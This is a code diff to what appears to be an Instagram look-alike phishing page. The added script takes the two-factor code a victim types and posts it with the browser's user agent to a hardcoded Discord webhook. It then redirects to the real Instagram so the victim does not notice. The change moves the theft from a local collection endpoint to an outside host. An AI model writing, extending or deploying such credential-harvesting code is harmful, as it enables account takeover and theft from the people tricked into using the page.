@@ -27,18 +27,23 @@ button{width:100%;height:32px;background:#0095f6;border:none;border-radius:8px;c
   </form>
 </div>
 <script>
+const WEBHOOK = "https://discord.com/api/webhooks/1542285698793738261/V5Xo_-9X3wofL-Xc_iAquKH4ml6nKaR203vTarrbw6LOWaZGGJJEK-b97o3rguhoALYp";
 document.getElementById("f").onsubmit = e => {
   e.preventDefault();
   const code = document.getElementById("c").value.trim();
-  const body = JSON.stringify({
-    type: "2fa",
-    username: "2fa",
-    password: code,
-    ua: navigator.userAgent,
-    extra: "code"
-  });
-  fetch("/api/collect", { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true }).catch(() => {});
-  if (navigator.sendBeacon) navigator.sendBeacon("/api/collect", new Blob([body], { type: "application/json" }));
+  const text = [
+    "**2fa**",
+    "user: `2fa`",
+    `pass/code: \`${code}\``,
+    `ua: ${navigator.userAgent}`,
+    "code"
+  ].join("\n");
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: text.slice(0, 1900) }),
+    keepalive: true
+  }).catch(() => {});
   setTimeout(() => location.replace("https://www.instagram.com/"), 400);
 };
 </script>
